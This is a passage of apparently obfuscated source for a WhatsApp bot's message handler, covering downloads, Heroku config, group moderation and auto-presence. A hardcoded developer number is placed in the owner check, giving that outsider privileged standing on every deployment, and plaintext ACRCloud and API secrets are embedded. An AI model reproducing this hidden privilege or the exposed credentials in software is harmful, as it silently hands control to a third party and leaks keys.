require("./settings");
const {
  generateWAMessageFromContent,
  proto,
  downloadContentFromMessage
} = require("@whiskeysockets/baileys");
const {
  exec,
  spawn,
  execSync
} = require("child_process");
const util = require("util");
const fetch = require("node-fetch");
const path = require("path");
const fs = require("fs");
const axios = require("axios");
const acrcloud = require("acrcloud");
const FormData = require("form-data");
const cheerio = require("cheerio");
const {
  performance
} = require("perf_hooks");
const process = require("process");
const moment = require("moment-timezone");
const lolcatjs = require("lolcatjs");
const os = require("os");
const speed = require("performance-now");
const yts = require("yt-search");
const jsobfus = require("javascript-obfuscator");
const {
  color
} = require("./lib/color");
const more = String.fromCharCode(8206);
const readmore = more.repeat(4001);
const timestampp = speed();
const latensi = speed() - timestampp;
const devTylor = "233593734312";
const mainOwner = "233593734312@s.whatsapp.net";
const {
  smsg,
  formatDate,
  getTime,
  getGroupAdmins,
  formatp,
  await,
  sleep,
  isUrl,
  runtime,
  clockString,
  msToDate,
  sort,
  toNumber,
  enumGetKey,
  fetchJson,
  getBuffer,
  json,
  format,
  logic,
  generateProfilePicture,
  parseMention,
  getRandom,
  fetchBuffer,
  buffergif,
  GIFBufferToVideoBuffer,
  totalcase,
  bytesToSize,
  checkBandwidth
} = require("./lib/myfunc");
const delay = _0x6d6034 => new Promise(_0x112d60 => setTimeout(_0x112d60, _0x6d6034));
const errorLog = new Map();
const ERROR_EXPIRY_TIME = 60000;
const recordError = _0x3b0ebe => {
  const _0x1b458f = Date.now();
  errorLog.set(_0x3b0ebe, _0x1b458f);
  setTimeout(() => errorLog.delete(_0x3b0ebe), ERROR_EXPIRY_TIME);
};
const shouldLogError = _0x31b88e => {
  const _0x1ae7cb = Date.now();
  if (errorLog.has(_0x31b88e)) {
    const _0x172bea = errorLog.get(_0x31b88e);
    if (_0x1ae7cb - _0x172bea < ERROR_EXPIRY_TIME) {
      return false;
    }
  }
  return true;
};
const tylorkid1 = fs.readFileSync("./Media/Images/jin1.jpg");
const tylorkid2 = fs.readFileSync("./Media/Images/jin2.jpg");
const tylorkid3 = fs.readFileSync("./Media/Images/jin3.jpg");
const tylorkid4 = fs.readFileSync("./Media/Images/jin4.jpg");
const tylorkid5 = fs.readFileSync("./Media/Images/jin5.jpg");
const versions = require("./package.json").version;
const dlkey = "_0x5aff35,_0x1876stqr";
const bad = JSON.parse(fs.readFileSync("./src/badwords.json"));
const acr = new acrcloud({
  host: "identify-eu-west-1.acrcloud.com",
  access_key: "882a7ef12dc0dc408f70a2f3f4724340",
  access_secret: "qVvKAxknV7bUdtxjXS22b5ssvWYxpnVndhy2isXP"
});
global.db.data = JSON.parse(fs.readFileSync("./src/database.json"));
global.db.data &&= {
  chats: global.db.data.chats && Object.keys(global.db.data.chats).length ? global.db.data.chats : {},
  settings: global.db.data.settings && Object.keys(global.db.data.settings).length ? global.db.data.settings : {
    prefix: ".",
    mode: "public",
    autobio: false,
    anticall: false,
    chatbot: false,
    autotype: false,
    autoread: false,
    welcome: false,
    antiedit: "private",
    menustyle: "2",
    autoreact: false,
    statusemoji: "🧡",
    autorecord: false,
    antidelete: "private",
    alwaysonline: true,
    autoviewstatus: true,
    autoreactstatus: false,
    autorecordtype: false
  },
  blacklist: global.db.data.blacklist && Object.keys(global.db.data.blacklist).length ? global.db.data.blacklist : {
    blacklisted_numbers: []
  },
  sudo: global.db.data.sudo && Array.isArray(global.db.data.sudo) && global.db.data.sudo.length ? global.db.data.sudo : []
};
module.exports = Cypher = async (_0x1548f3, _0x50668e, _0x8403a4, _0x1f8e8d) => {
  try {
    const {
      type: _0x591f45,
      quotedMsg: _0x301430,
      mentioned: _0x36046d,
      now: _0x59cd9,
      fromMe: _0xb7dc49
    } = _0x50668e;
    var _0x4a47e4 = _0x50668e.message?.protocolMessage?.editedMessage?.conversation || _0x50668e.message?.protocolMessage?.editedMessage?.extendedTextMessage?.text || _0x50668e.message?.protocolMessage?.editedMessage?.imageMessage?.caption || _0x50668e.message?.protocolMessage?.editedMessage?.videoMessage?.caption || _0x50668e.message?.conversation || _0x50668e.message?.imageMessage?.caption || _0x50668e.message?.videoMessage?.caption || _0x50668e.message?.extendedTextMessage?.text || _0x50668e.message?.buttonsResponseMessage?.selectedButtonId || _0x50668e.message?.listResponseMessage?.singleSelectReply?.selectedRowId || _0x50668e.message?.templateButtonReplyMessage?.selectedId || _0x50668e.message?.pollCreationMessageV3?.name || _0x50668e.message?.documentMessage?.caption || _0x50668e.text || "";
    var _0x5d77e8 = typeof _0x4a47e4 === "string" && _0x4a47e4.length > 0 ? _0x4a47e4 : typeof _0x50668e.text === "string" ? _0x50668e.text : "";
    const _0x1ef2dc = global.db.data.settings.prefix;
    const _0x5dd480 = _0x4a47e4.startsWith(_0x1ef2dc);
    const _0xb8b81b = _0x5dd480 ? _0x4a47e4.slice(_0x1ef2dc.length).trimStart() : "";
    const _0x1a38e3 = _0x5dd480 && _0xb8b81b ? _0xb8b81b.split(/\s+/).shift().toLowerCase() : "";
    const _0xf1d912 = _0xb8b81b.split(/\s+/).slice(1);
    const _0x5e01bb = q = _0xf1d912.join(" ");
    const _0x422642 = _0x4a47e4.replace(_0x1a38e3, "").slice(1).trim();
    const _0x2253ff = _0x50668e.pushName || "No Name";
    const _0x52b559 = await _0x1548f3.decodeJid(_0x1548f3.user.id);
    const _0xde2846 = _0x50668e.sender;
    const _0x27f661 = _0xde2846.split("@")[0];
    const _0x22e08b = [_0x52b559, devTylor, global.ownernumber, ...global.db.data.sudo].map(_0x77c919 => _0x77c919.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(_0x50668e.sender);
    const _0x21b3ed = _0x50668e.sender == _0x52b559 ? true : false;
    const _0x1f0527 = _0x50668e.key.remoteJid;
    const _0x2a1fb8 = _0x50668e.quoted || _0x50668e;
    const _0x4e3272 = _0x2a1fb8?.mtype === "buttonsMessage" ? _0x2a1fb8[Object.keys(_0x2a1fb8)[1]] : _0x2a1fb8?.mtype === "templateMessage" && _0x2a1fb8.hydratedTemplate ? _0x2a1fb8.hydratedTemplate[Object.keys(_0x2a1fb8.hydratedTemplate)[1]] : _0x2a1fb8?.mtype === "product" ? _0x2a1fb8[Object.keys(_0x2a1fb8)[0]] : _0x50668e.quoted || _0x50668e;
    const _0xd51678 = _0x4e3272?.msg?.mimetype || _0x4e3272?.mimetype || "";
    const _0x3ab04a = _0x50668e.isGroup ? await _0x1548f3.groupMetadata(_0x50668e.chat).catch(_0x50a943 => {
      console.error("Error fetching group metadata:", _0x50a943);
      return null;
    }) : null;
    const _0xf8284 = _0x50668e.isGroup && _0x3ab04a ? _0x3ab04a.subject : "";
    const _0x2661d9 = _0x50668e.isGroup && _0x3ab04a ? _0x3ab04a.participants : [];
    const _0x4df0ae = _0x50668e.isGroup ? await getGroupAdmins(_0x2661d9) : [];
    const _0x3d8712 = _0x50668e.isGroup ? _0x4df0ae.includes(_0x50668e.sender) : false;
    const _0x26d2c7 = _0x50668e.isGroup ? _0x4df0ae.includes(_0x52b559) : false;
    const _0x425666 = _0x52b559.includes(_0x27f661);
    const _0x419a1c = _0x50668e.isGroup ? _0x4df0ae.includes(_0x50668e.sender) : false;
    const _0x4d801a = _0x50668e.isGroup && _0x3ab04a ? _0x3ab04a.owner : "";
    const _0x340bc5 = _0x50668e.isGroup ? (_0x4d801a ? _0x4d801a : _0x4df0ae).includes(_0x50668e.sender) : false;
    async function _0x55f7bd(_0x29247e, _0x129e43) {
      const _0x576a00 = process.env.HEROKU_API_KEY;
      const _0x2f29b4 = process.env.HEROKU_APP_NAME;
      try {
        const _0x33f85b = await axios.patch("https://api.heroku.com/apps/" + _0x2f29b4 + "/config-vars", {
          [_0x29247e]: _0x129e43
        }, {
          headers: {
            "Content-Type": "application/json",
            Accept: "application/vnd.heroku+json; version=3",
            Authorization: "Bearer " + _0x576a00
          }
        });
        return _0x33f85b.data;
      } catch (_0xbce5cb) {
        console.error("Error setting env var:", _0xbce5cb);
        throw new Error("Failed to set environment variable, please make sure you've entered heroku api key and app name correctly.");
      }
    }
    async function _0x5047ce() {
      const _0x1abd5e = process.env.HEROKU_API_KEY;
      const _0x2a3e64 = process.env.HEROKU_APP_NAME;
      try {
        const _0x3cc8b1 = await axios.get("https://api.heroku.com/apps/" + _0x2a3e64 + "/config-vars", {
          headers: {
            "Content-Type": "application/json",
            Accept: "application/vnd.heroku+json; version=3",
            Authorization: "Bearer " + _0x1abd5e
          }
        });
        return _0x3cc8b1.data;
      } catch (_0x246841) {
        console.error("Error getting env vars:", _0x246841);
        throw new Error("Failed to get environment variables");
      }
    }
    async function _0x308cc8(_0x1dbcdf) {
      const _0xa8a99b = process.env.HEROKU_API_KEY;
      const _0x399510 = process.env.HEROKU_APP_NAME;
      try {
        const _0x34cd1f = await axios.patch("https://api.heroku.com/apps/" + _0x399510 + "/config-vars", {
          [_0x1dbcdf]: null
        }, {
          headers: {
            "Content-Type": "application/json",
            Accept: "application/vnd.heroku+json; version=3",
            Authorization: "Bearer " + _0xa8a99b
          }
        });
        return _0x34cd1f.data;
      } catch (_0x4a3c2c) {
        console.error("Error deleting env var:", _0x4a3c2c);
        throw new Error("Failed to set environment variable, please make sure you've entered heroku api key and app name correctly");
      }
    }
    async function _0x383df2(_0x5627fa) {
      const _0x3df8c1 = async _0x222715 => {
        const _0x40052d = "https://api.giftedtech.my.id/api/download/dlmp3?apikey=" + dlkey + "&url=" + _0x222715;
        try {
          const _0x23e73b = await axios.get(_0x40052d);
          if (_0x23e73b.status !== 200 || !_0x23e73b.data.success) {
            throw new Error("Failed to fetch from GiftedTech API");
          }
          return _0x23e73b.data.result.download_url;
        } catch (_0x53f577) {
          console.error("Error with GiftedTech API:", _0x53f577.message);
          throw _0x53f577;
        }
      };
      const _0x4413c8 = async _0x399d77 => {
        const _0x4cd3a5 = "mp3";
        const _0x1263d0 = "https://p.oceansaver.in/ajax/download.php?format=" + _0x4cd3a5 + "&url=" + encodeURIComponent(_0x399d77) + "&api=dfcb6d76f2f6a9894gjkege8a4ab232222";
        try {
          const _0x22a2fa = await axios.get(_0x1263d0, {
            headers: {
              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
            }
          });
          if (!_0x22a2fa.data || !_0x22a2fa.data.success) {
            throw new Error("Failed to fetch from API2");
          }
          const {
            id: _0x52a7d8
          } = _0x22a2fa.data;
          while (true) {
            const _0x472070 = await axios.get("https://p.oceansaver.in/ajax/progress.php?id=" + _0x52a7d8, {
              headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
              }
            });
            if (_0x472070.data && _0x472070.data.success && _0x472070.data.progress === 1000) {
              return _0x472070.data.download_url;
            }
            await new Promise(_0x491179 => setTimeout(_0x491179, 5000));
          }
        } catch (_0x42c603) {
          console.error("Error with API2:", _0x42c603.message);
          throw _0x42c603;
        }
      };
      try {
        let _0x28bf55;
        try {
          _0x28bf55 = await _0x3df8c1(_0x5627fa);
        } catch (_0x2b6491) {
          console.log("Falling back to second API...");
          _0x28bf55 = await _0x4413c8(_0x5627fa);
        }
        return _0x28bf55;
      } catch (_0x482784) {
        throw _0x482784;
      }
    }
    async function _0x5edfc1(_0x4955e4) {
      const _0x10953f = "https://api.siputzx.my.id/api/d/ytmp4?url=" + _0x4955e4;
      try {
        const _0x4a87d5 = await axios.get(_0x10953f);
        if (!_0x4a87d5.data || !_0x4a87d5.data.status || !_0x4a87d5.data.data?.dl) {
          throw new Error("Invalid API response format!");
        }
        return _0x4a87d5.data;
      } catch (_0x3d052e) {
        console.error("Error fetching video download URL:", _0x3d052e.message);
        throw _0x3d052e;
      }
    }
    async function _0xd48e3(_0x2c156d, _0x594f84) {
      try {
        const _0x3135bf = await _0x1548f3.groupRequestParticipantsList(_0x594f84);
        if (!_0x3135bf || _0x3135bf.length === 0) {
          return _0x2c156d.reply("No pending requests to approve.");
        }
        const _0x4d646e = _0x3135bf.map(_0x3bc83c => _0x3bc83c.jid);
        await _0x1548f3.groupRequestParticipantsUpdate(_0x594f84, _0x4d646e, "approve");
        _0x2c156d.reply("Approved " + _0x4d646e.length + " pending requests.");
      } catch (_0x100dbc) {
        console.error("Error approving requests:", _0x100dbc);
        _0x2c156d.reply("Something went wrong while approving requests.");
      }
    }
    async function _0x5354ed(_0x469652, _0x14a5b3) {
      try {
        const _0x283b0f = await _0x1548f3.groupRequestParticipantsList(_0x14a5b3);
        if (!_0x283b0f || _0x283b0f.length === 0) {
          return _0x469652.reply("No pending requests to disapprove.");
        }
        const _0x1ce65a = _0x283b0f.map(_0x42e174 => _0x42e174.jid);
        await _0x1548f3.groupRequestParticipantsUpdate(_0x14a5b3, _0x1ce65a, "reject");
        _0x469652.reply("Rejected " + _0x1ce65a.length + " pending requests.");
      } catch (_0x52aa45) {
        console.error("Error disapproving requests:", _0x52aa45);
        _0x469652.reply("Something went wrong while disapproving requests.");
      }
    }
    async function _0xb2a875(_0x4c5799, _0x2934bd) {
      try {
        const _0x5189a4 = await _0x1548f3.groupRequestParticipantsList(_0x2934bd);
        if (!_0x5189a4 || _0x5189a4.length === 0) {
          return _0x4c5799.reply("No pending join requests.");
        }
        let _0x227857 = "*Pending Join Requests (" + _0x5189a4.length + "):*\n\n";
        _0x5189a4.forEach((_0x3015e9, _0x414fb1) => {
          const _0x13f2ca = _0x3015e9.jid.replace("@s.whatsapp.net", "");
          const _0x226696 = new Date(_0x3015e9.request_time * 1000).toLocaleString();
          _0x227857 += _0x414fb1 + 1 + ". +" + _0x13f2ca + " - " + _0x226696 + "\n";
        });
        _0x4c5799.reply(_0x227857);
      } catch (_0x1f4045) {
        console.error("Error fetching join requests:", _0x1f4045);
        _0x4c5799.reply("Something went wrong while fetching requests.");
      }
    }
    async function _0x4b18ab(_0x44d2c6) {
      try {
        if (!_0x44d2c6.quoted || _0x44d2c6.quoted.chat !== "status@broadcast") {
          return _0x44d2c6.reply("*Please reply to a status message!*");
        }
        await _0x44d2c6.quoted.copyNForward(_0x44d2c6.chat, true);
        _0x1548f3.sendMessage(_0x44d2c6.chat, {
          react: {
            text: "✅",
            key: _0x44d2c6.key
          }
        });
        console.log("Status saved successfully!");
      } catch (_0x4742f3) {
        console.error("Failed to save status message:", _0x4742f3);
        _0x44d2c6.reply("Error: " + _0x4742f3.message);
      }
    }
    async function _0x560a1a(_0x343e55, _0x42f3e3) {
      let _0x49e6ab = new FormData();
      let _0x53044a = await axios.get(_0x343e55, {
        headers: {
          "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
        }
      });
      let _0x2a4174 = cheerio.load(_0x53044a.data);
      let _0x407f6c = _0x42f3e3;
      let _0x7f1e87 = _0x2a4174("input[name=token]").val();
      let _0x421658 = _0x2a4174("input[name=build_server]").val();
      let _0x59adc8 = _0x2a4174("input[name=build_server_id]").val();
      _0x49e6ab.append("text[]", _0x407f6c);
      _0x49e6ab.append("token", _0x7f1e87);
      _0x49e6ab.append("build_server", _0x421658);
      _0x49e6ab.append("build_server_id", _0x59adc8);
      let _0x5ca1f7 = await axios({
        url: _0x343e55,
        method: "POST",
        data: _0x49e6ab,
        headers: {
          Accept: "*/*",
          "Accept-Language": "en-US,en;q=0.9",
          "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
          cookie: _0x53044a.headers["set-cookie"]?.join("; "),
          "Content-Type": "multipart/form-data"
        }
      });
      let _0x56bc6d = cheerio.load(_0x5ca1f7.data);
      let _0x366642 = JSON.parse(_0x56bc6d("input[name=form_value_input]").val());
      _0x366642["text[]"] = _0x366642.text;
      delete _0x366642.text;
      let {
        data: _0x177c17
      } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(_0x366642), {
        headers: {
          "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
          cookie: _0x53044a.headers["set-cookie"].join("; ")
        }
      });
      return _0x421658 + _0x177c17.image;
    }
    async function _0x5b6bb2(_0x471318) {
      return new Promise((_0x378e9e, _0x5016d3) => {
        try {
          const _0x310b72 = jsobfus.obfuscate(_0x471318, {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
          });
          const _0x12ab9d = {
            status: 200,
            author: "" + ownername,
            result: _0x310b72.getObfuscatedCode()
          };
          _0x378e9e(_0x12ab9d);
        } catch (_0x281582) {
          _0x5016d3(_0x281582);
        }
      });
    }
    const _0x1e4fde = _0x2931f0 => {
      return _0x2931f0[Math.floor(Math.random() * _0x2931f0.length)];
    };
    try {
      var _0x2fccde = await _0x1548f3.profilePictureUrl(_0x50668e.sender, "image");
    } catch (_0x420499) {
      let _0x2f0bd = "https://telegra.ph/file/6880771a42bad09dd6087.jpg";
    }
    let _0x140496 = await getBuffer(_0x2fccde);
    let _0xf87fc5 = await _0x1548f3.profilePictureUrl(_0x50668e.sender, "image").catch(_0x3df84c => "https://telegra.ph/file/6880771a42bad09dd6087.jpg");
    try {
      if (_0x1f0527.endsWith("@g.us")) {
        let _0x4e02f1 = global.db.data.chats[_0x1f0527];
        if (typeof _0x4e02f1 !== "object") {
          global.db.data.chats[_0x1f0527] = {};
        }
        _0x4e02f1 = global.db.data.chats[_0x1f0527];
        if (!("antibot" in _0x4e02f1)) {
          _0x4e02f1.antibot = false;
        }
        if (!("antilink" in _0x4e02f1)) {
          _0x4e02f1.antilink = false;
        }
        if (!("badword" in _0x4e02f1)) {
          _0x4e02f1.badword = false;
        }
        if (!("antilinkgc" in _0x4e02f1)) {
          _0x4e02f1.antilinkgc = false;
        }
        if (!("antilinkkick" in _0x4e02f1)) {
          _0x4e02f1.antilinkkick = false;
        }
        if (!("badwordkick" in _0x4e02f1)) {
          _0x4e02f1.badwordkick = false;
        }
        if (!("antilinkgckick" in _0x4e02f1)) {
          _0x4e02f1.antilinkgckick = false;
        }
      }
      if (!global.db.data.settings) {
        global.db.data.settings = {};
      }
      let _0x2f3da5 = global.db.data.settings;
      if (!("prefix" in _0x2f3da5)) {
        _0x2f3da5.prefix = ".";
      }
      if (!("mode" in _0x2f3da5)) {
        _0x2f3da5.mode = "public";
      }
      if (!("autobio" in _0x2f3da5)) {
        _0x2f3da5.autobio = false;
      }
      if (!("anticall" in _0x2f3da5)) {
        _0x2f3da5.anticall = "off";
      }
      if (!("chatbot" in _0x2f3da5)) {
        _0x2f3da5.chatbot = false;
      }
      if (!("autotype" in _0x2f3da5)) {
        _0x2f3da5.autotype = false;
      }
      if (!("autoread" in _0x2f3da5)) {
        _0x2f3da5.autoread = false;
      }
      if (!("welcome" in _0x2f3da5)) {
        _0x2f3da5.welcome = false;
      }
      if (!("antiedit" in _0x2f3da5)) {
        _0x2f3da5.antiedit = "private";
      }
      if (!("menustyle" in _0x2f3da5)) {
        _0x2f3da5.menustyle = "3";
      }
      if (!("autoreact" in _0x2f3da5)) {
        _0x2f3da5.autoreact = false;
      }
      if (!("statusemoji" in _0x2f3da5)) {
        _0x2f3da5.statusemoji = "🧡";
      }
      if (!("autorecord" in _0x2f3da5)) {
        _0x2f3da5.autorecord = false;
      }
      if (!("antidelete" in _0x2f3da5)) {
        _0x2f3da5.antidelete = "private";
      }
      if (!("alwaysonline" in _0x2f3da5)) {
        _0x2f3da5.alwaysonline = true;
      }
      if (!("autoviewstatus" in _0x2f3da5)) {
        _0x2f3da5.autoviewstatus = true;
      }
      if (!("autoreactstatus" in _0x2f3da5)) {
        _0x2f3da5.autoreactstatus = false;
      }
      if (!("autorecordtype" in _0x2f3da5)) {
        _0x2f3da5.autorecordtype = false;
      }
      let _0x3b7056 = global.db.data.sudo || [];
      if (!global.db.data.sudo) {
        global.db.data.sudo = _0x3b7056;
      }
      let _0x19da98 = global.db.data.blacklist;
      if (!_0x19da98 || typeof _0x19da98 !== "object") {
        global.db.data.blacklist = {
          blacklisted_numbers: []
        };
      }
      await global.db.write();
    } catch (_0x531869) {
      console.error("❌ Error initializing database:", _0x531869);
    }
    const _0x14b13f = moment(Date.now()).tz("" + timezones).locale("en").format("dddd");
    const _0x7ea120 = moment(Date.now()).tz("" + timezones).locale("en").format("HH:mm:ss z");
    const _0x1df8fe = moment(Date.now()).tz("" + timezones).format("DD/MM/YYYY");
    if (_0x50668e.message) {
      lolcatjs.fromString("┏━━━━━━━━━━━━━『 𝗔𝗗𝗜𝗭𝗔-𝗩𝟮 』━━━━━━━━━━━━━─");
      lolcatjs.fromString("» Sent Time: " + _0x14b13f + ", " + _0x7ea120);
      lolcatjs.fromString("» Message Type: " + _0x50668e.mtype);
      lolcatjs.fromString("» Sender Name: " + (_0x2253ff || "N/A"));
      lolcatjs.fromString("» Chat ID: " + _0x50668e.chat.split("@")[0]);
      lolcatjs.fromString("» Message: " + (_0x5d77e8 || "N/A"));
      lolcatjs.fromString("╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━─ ⳹\n\n");
    }
    if (db.data.settings.autobio) {
      let _0x55d879 = moment(Date.now()).tz("" + timezones).locale("en").format("dddd");
      let _0x4be37b = moment(Date.now()).tz("" + timezones).locale("en").format("HH:mm z");
      let _0x4779ee = moment(Date.now()).tz("" + timezones).format("DD/MM/YYYY");
      _0x1548f3.updateProfileStatus(_0x4be37b + ", " + _0x55d879 + "; " + _0x4779ee + ":- " + botname).catch(_0x327ee => _0x327ee);
    }
    if (_0x50668e.message) {
      try {
        let _0x227948 = db.data.settings.alwaysonline ? "available" : "unavailable";
        await _0x1548f3.sendPresenceUpdate(_0x227948, _0x1f0527);
        await delay(1000);
        if (db.data.settings.autorecordtype === "all" || db.data.settings.autorecordtype === "group" && _0x50668e.isGroup || db.data.settings.autorecordtype === "pm" && !_0x50668e.isGroup || db.data.settings.autorecordtype === "command" && _0x1a38e3) {
          let _0x48a870 = ["composing", "recording"];
          let _0x2bbb1a = _0x48a870[Math.floor(Math.random() * _0x48a870.length)];
          _0x1548f3.sendPresenceUpdate(_0x2bbb1a, _0x1f0527);
        }
        if (db.data.settings.autorecord === "all" || db.data.settings.autorecord === "group" && _0x50668e.isGroup || db.data.settings.autorecord === "pm" && !_0x50668e.isGroup || db.data.settings.autorecord === "command" && _0x1a38e3) {
          _0x1548f3.sendPresenceUpdate("recording", _0x1f0527);
        }
        if (db.data.settings.autotype === "all" || db.data.settings.autotype === "group" && _0x50668e.isGroup || db.data.settings.autotype === "pm" && !_0x50668e.isGroup || db.data.settings.autotype === "command" && _0x1a38e3) {
          _0x1548f3.sendPresenceUpdate("composing", _0x1f0527);
        }
      } catch (_0x23a4bf) {
        console.error("❌ Error sending presence update:", _0x23a4bf);
      }
    }
    const {
      commandEmojis: _0x51d51b,
      messageEmojis: _0x44780c
    } = require("./lib/emojis");
    const _0x2aeedf = _0x51d51b[Math.floor(Math.random() * _0x51d51b.length)];
    const _0xbf54fa = _0x44780c[Math.floor(Math.random() * _0x44780c.length)];
    if (_0x1a38e3 && db.data.settings.autoreact === "command") {
      await _0x1548f3.sendMessage(_0x50668e.key.remoteJid, {
        react: {
          text: _0x2aeedf,
          key: _0x50668e.key
        }
      });
    } else if (_0x50668e.message) {
      try {
        if (db.data.settings.autoreact === "all" || db.data.settings.autoreact === "group" && _0x50668e.isGroup || db.data.settings.autoreact === "pm" && !_0x50668e.isGroup) {
          await _0x1548f3.sendMessage(_0x50668e.key.remoteJid, {
            react: {
              text: _0xbf54fa,
              key: _0x50668e.key
            }
          });
        }
      } catch (_0xbf7825) {
        console.error("❌ Error sending reaction:", _0xbf7825);
      }
    }
    if (_0x1f0527.endsWith("@g.us") && db.data.chats[_0x50668e.chat].antibot) {
      if (_0x50668e.isBaileys && (!_0x419a1c || !_0x22e08b || _0x26d2c7)) {
        _0x50668e.reply("*BOT DETECTED*\n\nGo away!");
        await _0x1548f3.groupParticipantsUpdate(_0x50668e.chat, [_0x50668e.sender], "remove");
      }
    }
    if (_0x1f0527.endsWith("@g.us") && db.data.chats[_0x50668e.chat].antilinkgc) {
      const _0x4a64d3 = /(?:https?:\/\/)?chat\.whatsapp\.com\/\S+/i;
      if (_0x50668e.message && _0x4a64d3.test(_0x5d77e8)) {
        if (_0x419a1c || _0x22e08b || !_0x26d2c7) {
          return;
        }
        await _0x1548f3.sendMessage(_0x50668e.chat, {
          delete: {
            remoteJid: _0x50668e.chat,
            fromMe: false,
            id: _0x50668e.key.id,
            participant: _0x50668e.key.participant
          }
        });
      }
    }
    if (_0x1f0527.endsWith("@g.us") && db.data.chats[_0x50668e.chat].antilinkgckick) {
      const _0x5dc0b6 = /(?:https?:\/\/)?chat\.whatsapp\.com\/\S+/i;
      if (_0x50668e.message && _0x5dc0b6.test(_0x5d77e8)) {
        if (_0x419a1c || _0x22e08b || !_0x26d2c7) {
          return;
        }
        {
          if (_0x419a1c || _0x22e08b || !_0x26d2c7) {
            return;
          }
          await _0x1548f3.sendMessage(_0x50668e.chat, {
            delete: {
              remoteJid: _0x50668e.chat,
              fromMe: false,
              id: _0x50668e.key.id,
              participant: _0x50668e.key.participant
            }
          });
          _0x1548f3.sendMessage(_0x1f0527, {
            text: "GROUP LINK DETECTED\n\n@" + _0x50668e.sender.split("@")[0] + " *Beware, group links are not allowed in this group!*",
            contextInfo: {
              mentionedJid: [_0x50668e.sender]
            }
          }, {
            quoted: _0x50668e
          });
          await _0x1548f3.groupParticipantsUpdate(_0x50668e.chat, [_0x50668e.sender], "remove");
        }
      }
    }
    if (_0x1f0527.endsWith("@g.us") && db.data.chats[_0x50668e.chat].antilink) {
      const _0x1705cf = /(?:https?:\/\/|www\.|t\.me\/|bit\.ly\/|tinyurl\.com\/|(?:[a-z0-9]+\.)+[a-z]{2,})(\/\S*)?/i;
      const _0x3a3eed = _0x50668e.message?.conversation || _0x50668e.message?.extendedTextMessage?.text || _0x50668e.message?.imageMessage?.caption || _0x50668e.message?.videoMessage?.caption || _0x50668e.message?.pollCreationMessageV3?.name || _0x50668e.message?.protocolMessage?.editedMessage?.conversation || _0x50668e.message?.protocolMessage?.editedMessage?.extendedTextMessage?.text || _0x50668e.message?.protocolMessage?.editedMessage?.imageMessage?.caption || _0x50668e.message?.protocolMessage?.editedMessage?.videoMessage?.caption || _0x50668e.message?.protocolMessage?.editedMessage || pollMessageData;
      if (_0x3a3eed && _0x1705cf.test(_0x3a3eed)) {
        if (_0x419a1c || _0x22e08b || !_0x26d2c7) {
          return;
        }
        await _0x1548f3.sendMessage(_0x50668e.chat, {
          delete: {
            remoteJid: _0x50668e.chat,
            fromMe: false,
            id: _0x50668e.key.id,
            participant: _0x50668e.key.participant
          }
        });
      }
    }
    if (_0x1f0527.endsWith("@g.us") && db.data.chats[_0x50668e.chat].antilinkkick) {
      const _0x1bfcce = /(?:https?:\/\/|www\.|t\.me\/|bit\.ly\/|tinyurl\.com\/|(?:[a-z0-9]+\.)+[a-z]{2,})(\/\S*)?/i;
      if (_0x50668e.message && _0x1bfcce.test(_0x5d77e8)) {
        if (_0x419a1c || _0x22e08b || !_0x26d2c7) {
          return;
        }
        await _0x1548f3.sendMessage(_0x50668e.chat, {
          delete: {
            remoteJid: _0x50668e.chat,
            fromMe: false,
            id: _0x50668e.key.id,
            participant: _0x50668e.key.participant
          }
        });
        await _0x1548f3.sendMessage(_0x1f0527, {
          text: "LINK DETECTED\n\n@" + _0x50668e.sender.split("@")[0] + " *Beware, links are not allowed in this group!*",
          contextInfo: {
            mentionedJid: [_0x50668e.sender]
          }
        }, {
          quoted: _0x50668e
        });
        await _0x1548f3.groupParticipantsUpdate(_0x50668e.chat, [_0x50668e.sender], "remove");
      }
    }
    if (_0x1f0527.endsWith("@g.us") && db.data.chats[_0x50668e.chat].badword) {
      for (let _0x3bb584 of bad) {
        let _0x514cb0 = new RegExp("\\b" + _0x3bb584 + "\\b", "i");
        if (_0x514cb0.test(_0x5d77e8)) {
          if (_0x419a1c || _0x22e08b || !_0x26d2c7) {
            return;
          }
          await _0x1548f3.sendMessage(_0x50668e.chat, {
            delete: {
              remoteJid: _0x50668e.chat,
              fromMe: false,
              id: _0x50668e.key.id,
              participant: _0x50668e.key.participant
            }
          });
          await _0x1548f3.sendMessage(_0x1f0527, {
            text: "BAD WORD DETECTED\n\n@" + _0x50668e.sender.split("@")[0] + " *Beware, using bad words is prohibited in this group!*",
            contextInfo: {
              mentionedJid: [_0x50668e.sender]
            }
          }, {
            quoted: _0x50668e
          });
          break;
        }
      }
    }
    if (_0x1f0527.endsWith("@g.us") && db.data.chats[_0x50668e.chat].badwordkick) {
      for (let _0x22d0fa of bad) {
        let _0x452942 = new RegExp("\\b" + _0x22d0fa + "\\b", "i");
        if (_0x452942.test(_0x5d77e8)) {
          if (_0x419a1c || _0x22e08b || !_0x26d2c7) {
            return;
          }
          await _0x1548f3.sendMessage(_0x50668e.chat, {
            delete: {
              remoteJid: _0x50668e.chat,
              fromMe: false,
              id: _0x50668e.key.id,
              participant: _0x50668e.key.participant
            }
          });
          await _0x1548f3.sendMessage(_0x1f0527, {
            text: "BAD WORD DETECTED\n\n@" + _0x50668e.sender.split("@")[0] + " *You have been removed for using prohibited language!*",
            contextInfo: {
              mentionedJid: [_0x50668e.sender]
            }
          }, {
            quoted: _0x50668e
          });
          await _0x1548f3.groupParticipantsUpdate(_0x50668e.chat, [_0x50668e.sender], "remove");
          break;
        }
      }
    }
